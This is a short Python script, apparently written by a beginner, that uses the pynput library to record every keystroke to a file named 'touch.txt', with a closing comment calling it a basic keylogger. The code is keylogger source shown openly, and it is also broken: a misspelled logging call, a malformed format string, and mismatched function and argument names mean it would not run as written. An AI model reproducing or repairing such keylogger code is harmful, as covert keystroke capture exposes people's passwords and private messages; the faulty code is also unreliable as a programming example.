from pynput.keyboard import Listener
import logging

file = "touch.txt"
logging.basecConfig(filename=file, level=logging.DEBUG, format="%(asctime) s %(messages")

def onpress(key):
   logging.info(key)

with Listener(in_press=on_press) as listener:
  listener.join()
# its a basic kelylogger its not a big spy software
